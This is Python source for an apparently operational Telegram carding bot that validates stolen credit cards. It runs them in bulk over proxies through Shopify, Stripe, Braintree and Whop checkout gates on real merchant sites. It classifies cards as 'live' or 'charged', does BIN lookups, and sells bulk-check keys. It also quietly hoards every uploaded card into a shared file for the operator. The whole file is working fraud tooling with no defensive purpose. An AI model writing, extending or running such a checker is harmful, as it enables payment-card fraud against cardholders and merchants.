# v75 — Help page navigation callback (Next/Prev buttons)
@router.callback_query(F.data.startswith("help_page:"))
async def cb_help_page(callback: types.CallbackQuery):
    """Handle the Prev/Next buttons on the /cmds help pages."""
    try:
        page_str = callback.data.split(":", 1)[1]
        page = int(page_str)
    except (ValueError, IndexError):
        page = 1
    if page < 1:
        page = 1
    if page > 2:
        page = 2
    text, kb = _help_page(page)
    try:
        await callback.message.edit_text(text, reply_markup=kb)
    except Exception:
        # Edit failed (message too old / deleted) — send as new message
        try:
            await callback.message.answer(text, reply_markup=kb)
        except Exception:
            pass
    await safe_callback_answer(callback)


@router.callback_query(F.data == "help_noop")
async def cb_help_noop(callback: types.CallbackQuery):
    """Silent answer for the 'Page X/Y' label button (no action)."""
    await safe_callback_answer(callback)


@router.message(Command("cmds", "help"))
async def cmd_help(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    text, kb = _help_page(1)
    await message.reply(text, reply_markup=kb)


@router.callback_query(F.data.startswith("helpp:"))
async def cb_help_page(callback: types.CallbackQuery):
    raw = callback.data.split(":", 1)[1]
    if raw == "noop":
        await safe_callback_answer(callback)
        return
    try:
        page = int(raw)
    except ValueError:
        await safe_callback_answer(callback)
        return
    page = max(1, min(3, page))
    text, kb = _help_page(page)
    try:
        await safe_edit(callback.message, text, reply_markup=kb)
    except Exception:
        pass
    await safe_callback_answer(callback)


# ══════════════════════════════════════════════════════════════════════════════
#  CATCH-ALL for non-command messages (DISABLED — no auto-detect on plain text)
# ══════════════════════════════════════════════════════════════════════════════
# NOTE: Auto-detect of cards pasted as plain message text has been REMOVED
# per operator spec. Users must use explicit commands:
#   /whop cc|mm|yy|cvv ...     (1-50 cards, free for everyone)
#   /mwhop cc|mm|yy|cvv ...    (bulk, redeemed-key users, max 1000)
#   /sh cc|mm|yy|cvv ...       (1-30 cards, free for everyone)
#   /msh cc|mm|yy|cvv ...      (bulk, redeemed-key users, max 1000)
#   /mst <stripe_url> cc|...   (free for redeemed-key users, max 10 per link)
#   /mmst <url1> <url2> ...    (mass multi-URL ST, auto-cuts 10 per URL)
#   /b3 <form_url> cc|...      (Braintree gate, 1-20 cards, owner-only)
#   /mb3 <form_url>            (Braintree gate bulk, .txt, owner-only)
# Or upload a .txt file — the bot will detect CCs in the file and show
# /mwhop and /msh buttons automatically.

@router.message(F.text & ~F.text.startswith("/"))
async def handle_plain_text(message: types.Message):
    """No-op — auto-detect on plain text is disabled.

    Users must use explicit commands (/whop, /mwhop, /sh, /msh, /mst,
    /mmst, /b3, /mb3) or upload a .txt file. This handler exists only to
    silently absorb non-command text messages so they don't trigger any
    unintended behavior.
    """
    return


@router.callback_query(F.data.startswith("quick_check:"))
async def cb_quick_check(callback: types.CallbackQuery):
    cc_str = callback.data.split(":", 1)[1]
    user_id = callback.from_user.id

    # Check proxy
    proxy_data = get_user_proxy(user_id)
    if not proxy_data:
        _gfb = _global_fallback_proxy_dicts()
        proxy_data = _gfb[0] if _gfb else None
    if not proxy_data:
        await safe_callback_answer(callback, bold("Add a proxy first! Use /proxy"), show_alert=True)
        return

    await safe_callback_answer(callback)

    site = get_random_site()
    if not site:
        await callback.message.reply(
            f"{pe(E['cross'])} {bold('No sites available!')}"
        )
        return

    cc_number = cc_str.split("|")[0]
    bin_num = cc_number[:6]

    loading_msg = await callback.message.reply(
        f"{pe(E['loading'])} {bold('Checking CC...')}\n\n"
        f"{pe(E['bolt'])} {bold('CC:')} <tg-spoiler>{cc_str}</tg-spoiler>\n"
        f"{pe(E['globe'])} {bold('Site:')} {bold(site.split('//')[1][:30] if '//' in site else site[:30])}\n"
        f"{pe(E['hourglass'])} {bold('Processing with Shopify gateway...')}"
    )

    # ── Run check + BIN lookup in parallel (saves 2-10s) ──────────────────────
    _chk = asyncio.create_task(checker_bridge.check_card_site(cc_str, site, proxy_data))
    _bin = asyncio.create_task(bin_lookup(bin_num))
    try:
        result = await _chk
    except Exception:
        result = {
            "Response": "Card declined",
            "Price": "-",
            "Gate": "-",
            "Status": "Dead",
        }
    bin_info = await _bin

    # Format result (same logic as /sh)
    response = result.get("Response", "Unknown")
    price = result.get("Price", "-")
    gate = result.get("Gate", "-")

    rl = response.lower()
    if _is_charged_response(response, result):
        status_emoji = E["gem"]
        status_line = f"{pe(E['gem'])} {bold('Order Placed!')}"
    elif any(k in rl for k in ["insufficient_funds", "insufficient funds"]):
        status_emoji = E["check2"]
        status_line = f"{pe(E['check2'])} {bold('Insufficient Funds — CVV Matched!')}"
    elif any(k in rl for k in ["incorrect_cvc", "invalid_cvc", "incorrect_cvv", "invalid_cvv"]):
        status_emoji = E["check3"]
        status_line = f"{pe(E['check3'])} {bold('Incorrect CVC — CCN Matched!')}"
    elif any(k in rl for k in ["incorrect_zip"]):
        status_emoji = E["check"]
        status_line = f"{pe(E['check'])} {bold('Incorrect ZIP — Card is Live!')}"
    elif "otp_required" in rl or "3ds" in rl:
        status_emoji = E["check"]
        status_line = f"{pe(E['check'])} {bold('3DS / OTP Required — Card is Live!')}"
    elif any(k in rl for k in ["card_declined", "do_not_honor", "declined"]):
        status_emoji = E["cross"]
        status_line = f"{pe(E['cross'])} {bold('Card Declined')}"
    elif "expired" in rl:
        status_emoji = E["cross2"]
        status_line = f"{pe(E['cross2'])} {bold('Card Expired')}"
    elif "risky" in rl:
        status_emoji = E["warn"]
        status_line = f"{pe(E['warn'])} {bold('Flagged as Risky')}"
    elif "incorrect_number" in rl:
        status_emoji = E["cross3"]
        status_line = f"{pe(E['cross3'])} {bold('Incorrect Card Number')}"
    else:
        status_emoji = E["warn2"]
        status_line = f"{pe(E['warn2'])} {bold(response[:60])}"

    result_text = (
        f"{status_line}\n\n"
        f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc_str}</tg-spoiler>\n"
        f"{pe(R['gate'])} {bold('Gate:')} {bold(gate)}\n"
        f"{pe(R['price'])} {bold('Price:')} {bold(str(price))}\n"
        f"{pe(E['globe'])} {bold('Site:')} {bold(site if site else '-')}\n\n"
        f"{pe(R['bin_info'])} {bold('BIN Info:')}\n"
        f"{brand_emoji(bin_info['brand'])}{bold('Brand:')} {bold(bin_info['brand'])}\n"
        f"{pe(R['type'])} {bold('Type:')} {bold(bin_info['type'])}\n"
        f"{pe(R['level'])} {bold('Level:')} {bold(bin_info['level'])}\n"
        f"{pe(R['bank'])} {bold('Bank:')} {bold(bin_info['bank'])}\n"
        f"{pe(R['country'])} {bold('Country:')} {bin_info['flag']} {bold(bin_info['country'])}\n\n"
        f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(callback.from_user.id, callback.from_user.full_name, callback.from_user.username)}"
    )

    try:
        await safe_edit(loading_msg, result_text)
    except Exception:
        await callback.message.reply(result_text)

    # ── Append to hit_sites.txt (order placed / declined / insufficient / 3DS) ─
    _hit_label = _classify_hit_response(response, result)
    log.info("[quick_check] cc=%s site=%s price=%s response=%r -> hit_label=%r",
             cc_str.split('|')[0], site, price, response[:80], _hit_label)
    await _log_check_debug("quick_check", cc_str, site, result, _hit_label)
    if _hit_label:
        await _save_hit_site(site, price, _hit_label)

    # Pin if order placed / charged
    if _is_charged_response(response, result):
        auth.save_charged_cc(cc_str, user_id, (callback.from_user.full_name or "Unknown"), gate, str(price))
        try:
            await bot.pin_chat_message(callback.message.chat.id, loading_msg.message_id, disable_notification=True)
        except Exception:
            pass
        # Silent forward to monitor group
        try:
            await _send_charged_group(user_id, result_text)
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════════════════
#  QUICK MASS CHECK CALLBACK (from CC detect button)
# ══════════════════════════════════════════════════════════════════════════════

@router.callback_query(F.data.startswith("quick_msh:"))
async def cb_quick_msh(callback: types.CallbackQuery):
    user_id = callback.from_user.id

    # Check proxy
    proxy_data = get_user_proxy(user_id)
    if not proxy_data:
        _gfb = _global_fallback_proxy_dicts()
        proxy_data = _gfb[0] if _gfb else None
    if not proxy_data:
        await safe_callback_answer(callback, bold("Add a proxy first! Use /proxy"), show_alert=True)
        return

    await safe_callback_answer(callback)

    # Get the original message that had the CCs
    orig_msg = callback.message.reply_to_message
    if not orig_msg:
        await callback.message.reply(
            f"{pe(E['cross'])} {bold('Original message not found!')}"
        )
        return

    text = orig_msg.text or orig_msg.caption or ""

    # Extract CCs
    from helpers import CC_PATTERN
    all_ccs = _DedupeList()
    for m in CC_PATTERN.finditer(text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)

    if not all_ccs:
        for line in text.strip().splitlines():
            line = line.strip()
            parts = re.split(r'[|/]', line)
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
                if cc not in all_ccs:
                    all_ccs.append(cc)

    if not all_ccs:
        await callback.message.reply(
            f"{pe(E['cross'])} {bold('No CCs found in the original message!')}"
        )
        return

    all_ccs = all_ccs[:MSH_MAX_CCS]

    # ── Gen-checker detection ─────────────────────────────────────────────────
    if not await guard_gen_cards(all_ccs, callback.message, callback.from_user.id):
        return

    # ── Pre-load sites ONCE ───────────────────────────────────────────────────
    sites_list = _load_sites()
    if not sites_list:
        await callback.message.reply(f"{pe(E['cross'])} {bold('No sites available!')}")
        return

    user_name = callback.from_user.full_name or ""
    user_uname = callback.from_user.username or ""
    total = len(all_ccs)

    # Build single status message
    init_lines = [f"{pe(E['bolt'])} {bold('Mass Check')} [{bold('0')}/{bold(str(total))}]\n"]
    for cc in all_ccs:
        init_lines.append(f"{pe(E['loading'])} <tg-spoiler>{cc}</tg-spoiler> {bold('checking...')}")
    init_lines.append(f"\n{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}")

    status_msg = await callback.message.reply("\n\n".join(init_lines))

    results: dict = {}
    order = list(all_ccs)

    tasks = [
        asyncio.create_task(
            _msh_check_single(cc, proxy_data, status_msg, results, order, user_name, user_uname, user_id, sites_list)
        )
        for cc in all_ccs
    ]
    await asyncio.gather(*tasks, return_exceptions=True)

    # ════════════════════════════════════════════════════════════════════════
    # FINAL RECONCILIATION PASS — guarantees EVERY card is logged to
    # hit_sites.txt / hits_debug.txt, even if the in-flight logging inside
    # _msh_check_single was swallowed by gather(return_exceptions=True).
    # ════════════════════════════════════════════════════════════════════════
    try:
        _hits_written = await _finalize_bulk_hits(results, order, source="quick_msh")
        log.info("[quick_msh] Final pass wrote %d hit lines for %d cards", _hits_written, len(all_ccs))
    except Exception as _fp_exc:
        log.error("[quick_msh] Final reconciliation pass crashed: %s", _fp_exc, exc_info=True)


# ══════════════════════════════════════════════════════════════════════════════
#  AUTO-DETECT .txt FILE IN PRIVATE CHAT
# ══════════════════════════════════════════════════════════════════════════════

@router.message(F.document & F.chat.type.in_({"private"}))
async def handle_private_document(message: types.Message):
    """Auto-detect .txt CC files dropped in private chat. Whop-only."""
    doc = message.document
    if not doc or not doc.file_name or not doc.file_name.lower().endswith(".txt"):
        return

    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    if auth.is_banned(message.from_user.id):
        return
    if await guard_gen_filename(message, message.from_user.id):
        return

    # Download and count CCs
    try:
        from io import BytesIO
        buf = BytesIO()
        await bot.download(doc.file_id, destination=buf)
        buf.seek(0)
        file_text = buf.read().decode("utf-8", errors="ignore")
    except Exception:
        return

    from helpers import CC_PATTERN
    all_ccs = _DedupeList()
    for m in CC_PATTERN.finditer(file_text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)
    if not all_ccs:
        for line in file_text.strip().splitlines():
            line = line.strip()
            parts = re.split(r'[|/]', line)
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
                if cc not in all_ccs:
                    all_ccs.append(cc)

    if not all_ccs:
        # ── v25 OWNER ONLY: sites .txt upload for /checksites ───────────
        # A .txt WITHOUT cards but WITH URLs, uploaded by the OWNER with
        # "site" in the filename → saved as the /checksites site list.
        # Everyone else (and every card file) keeps the original
        # behaviour below — nothing else changed.
        if (_checksites_is_owner(message.from_user.id)
                and doc.file_name
                and "site" in doc.file_name.lower()):
            _cs_saved = _checksites_save_sites(file_text)
            if _cs_saved:
                await message.reply(
                    f"{wpe('sparkle')} {_to_bi('Sites Saved')} {wpe('sparkle')}\n"
                    f"{_CHECKSITES_SEP}\n"
                    f"{wpe('triple_ring')} {_to_bi('File:')} "
                    f"{_to_bi(doc.file_name)}\n"
                    f"{wpe('link')} {_to_bi('URLs loaded:')} "
                    f"{_to_bi(str(_cs_saved))}\n"
                    f"{wpe('arrow_right')} {_to_bi('Run:')} "
                    f"/checksites cc|mm|yy|cvv\n"
                    f"{_CHECKSITES_SEP}\n"
                    f"{wpe('whop_hitter')} {_to_bi('Whopex')}\n"
                    f"{_to_bi('Made by @tatsuyo_001')}"
                )
                return
        await message.reply(
            f"{wpe('skull')} {_to_bi('No valid CCs found in this file!')}"
        )
        return

    count = len(all_ccs)

    # ── Auto-save EVERY uploaded card to all_cards.txt (global, append) ──
    # Every single user's uploaded cards land here — owner can audit/share.
    await _append_to_all_cards(
        ccs=list(all_ccs),
        user_id=message.from_user.id,
        user_name=message.from_user.full_name or "",
        user_uname=message.from_user.username or "",
        source=f"upload:{doc.file_name}",
    )

    # Store the file_id + CC list for the callback handler
    _WHOP_FILE_CACHE[message.message_id] = {
        "file_id": doc.file_id,
        "file_name": doc.file_name,
        "ccs": list(all_ccs),
        "user_id": message.from_user.id,
    }

    # ── Users without redeemed key: tell them to use /whop ──────────────
    if not has_whop_bulk_access(message.from_user.id):
        await message.reply(
            f"{wpe('whop_hitter')} {_to_bi('CC DETECTED')} "
            f"{_to_bi(str(count))} {wpe('whop_hitter')}\n\n"
            f"{wpe('triple_ring')} {_to_bi('File:')} {_to_bi(doc.file_name)}\n"
            f"{wpe('star')} {_to_bi('Total CCs:')} {_to_bi(str(count))}\n\n"
            f"{wpe('skull')} {_to_bi('Redeemed key required for bulk check.')}\n"
            f"{wpe('arrow_right')} {_to_bi('Use /whop to check up to 50 cards (free).')}\n\n"
            f"{wpe('gift')} {_to_bi('Redeem with:')} /redeem &lt;key&gt;\n"
            f"{wpe('star')} {_to_bi('Get a key from admin: @tatsuyo_001 (1000 cards per /mwhop)')}"
        )
        return

    check_btn = {
        "inline_keyboard": [
            [
                {
                    "text": f"{bold('/mwhop')} — {_to_bi('Bulk Whop')}",
                    "callback_data": f"whop_file_start:{message.message_id}",
                    "icon_custom_emoji_id": WE["whop_hitter"],
                    "style": "primary",
                },
                {
                    "text": f"{bold('/msh')} — {_to_bi('Bulk Shopify')}",
                    "callback_data": f"shopify_file_start:{message.message_id}",
                    "icon_custom_emoji_id": WE["sparkle"],
                    "style": "success",
                },
            ],
        ]
    }

    await message.reply(
        f"{wpe('whop_hitter')} {_to_bi('CC DETECTED')} "
        f"{_to_bi(str(count))} {wpe('whop_hitter')}\n\n"
        f"{wpe('triple_ring')} {_to_bi('File:')} {_to_bi(doc.file_name)}\n"
        f"{wpe('star')} {_to_bi('Total CCs:')} {_to_bi(str(count))}\n\n"
        f"{wpe('arrow_right')} {_to_bi('Choose a checker below:')}",
        reply_markup=check_btn,
    )


# Cache for file uploads (msg_id → file info + CC list)
_WHOP_FILE_CACHE: dict = {}


# ══════════════════════════════════════════════════════════════════════════════
#  WHOP BULK PROCESSOR  —  live UI with counters + STOP button
# ══════════════════════════════════════════════════════════════════════════════



@router.callback_query(F.data.startswith("whop_file_start:"))
async def cb_whop_file_start(callback: types.CallbackQuery):
    """Start Whop bulk check from an uploaded .txt file."""
    user_id = callback.from_user.id
    if auth.is_banned(user_id):
        return

    # ── Block duplicate runs FIRST (before anything else) ────────────────
    if user_id in _WHOP_BULK_ACTIVE:
        await safe_callback_answer(callback,
            _to_bi("You already have a bulk check in progress! Wait for it to finish or tap STOP first."),
            show_alert=True,
        )
        return

    # Access gate (admin, /adduser'd user, or redeemed-key user)
    if not has_whop_bulk_access(user_id):
        await safe_callback_answer(callback,
            _to_bi("Redeemed key required — use /redeem &lt;key&gt; or /whop for 1-50 cards"),
            show_alert=True,
        )
        return


    msg_id_str = callback.data.split(":", 1)[1]
    try:
        orig_msg_id = int(msg_id_str)
    except ValueError:
        await safe_callback_answer(callback)
        return

    cached = _WHOP_FILE_CACHE.get(orig_msg_id)
    if not cached:
        await safe_callback_answer(callback, _to_bi("File expired — re-upload the .txt"), show_alert=True)
        return

    if cached["user_id"] != user_id:
        await safe_callback_answer(callback, _to_bi("This is not your file!"), show_alert=True)
        return

    await safe_callback_answer(callback)

    all_ccs = cached["ccs"]
    original_count = len(all_ccs)
    user_name = callback.from_user.full_name or ""
    user_uname = callback.from_user.username or ""
    chat_id = callback.message.chat.id

    # ── Enforce normal-user 1000 card limit ────────────────────────────
    is_admin_user = False
    try:
        is_admin_user = auth.is_admin(user_id)
    except Exception:
        pass
    is_owner = getattr(auth, "OWNER_ID", None) == user_id

    if not is_admin_user and not is_owner:
        if original_count > FREE_USER_BULK_LIMIT:
            cut_amount = original_count - FREE_USER_BULK_LIMIT
            all_ccs = all_ccs[:FREE_USER_BULK_LIMIT]
            await callback.message.reply(
                f"{wpe('warn')} {_to_bi('File Auto-Cut')}\n\n"
                f"{wpe('triple_ring')} {_to_bi('Original:')} {_to_bi(str(original_count))} {_to_bi('cards')}\n"
                f"{wpe('skull')} {_to_bi('Cut:')} {_to_bi(str(cut_amount))} {_to_bi('cards')}\n"
                f"{wpe('check')} {_to_bi('Checking:')} {_to_bi(str(len(all_ccs)))} {_to_bi('cards')}\n\n"
                f"{wpe('star')} {_to_bi(f'Max {FREE_USER_BULK_LIMIT} cards for normal users.')}\n"
                f"{wpe('arrow_right')} {_to_bi('For unlimited, contact admin: @tatsuyo_001')}"
            )

    stop_key = _whop_bulk_stop_key(chat_id, user_id)
    _WHOP_BULK_STOP_FLAGS[stop_key] = False
    _WHOP_BULK_ACTIVE.add(user_id)

    stop_btn = {
        "inline_keyboard": [[{
            "text": f"{bold('STOP')}",
            "callback_data": f"whop_bulk_stop:{stop_key}",
            "icon_custom_emoji_id": WE.get("skull", "5440681540541502133"),
            "style": "danger",
        }]]
    }

    status_msg = await callback.message.reply(
        f"{wpe('whop_hitter')} {_to_bi('Whopex Bulk Check')} {wpe('whop_hitter')}\n\n"
        f"{'=' * 30}\n"
        f"{wpe('triple_ring')} {_to_bi('Total:')} {_to_bi(str(len(all_ccs)))}\n"
        f"{wpe('arc_reactor')} {_to_bi('Starting...')} {wpe('processing')}\n"
        f"{'=' * 30}",
        reply_markup=stop_btn,
    )

    # Run the bulk processor as a BACKGROUND task so this callback handler
    # completes immediately and frees the aiogram update slot. This prevents
    # the bot from appearing frozen when many users click buttons at once.
    async def _run_bulk():
        try:
            await _whop_bulk_processor(
                all_ccs, user_id, user_name, user_uname,
                chat_id, status_msg, stop_key,
            )
        except Exception as e:
            log.error("Bulk processor crashed: %s", e, exc_info=True)
            try:
                await safe_edit(status_msg,
                    f"{wpe('hourglass')} {_to_bi('Batch interrupted — please start it again.')}")
            except Exception:
                pass
        finally:
            _WHOP_BULK_ACTIVE.discard(user_id)
            _WHOP_FILE_CACHE.pop(orig_msg_id, None)

    asyncio.create_task(_run_bulk())


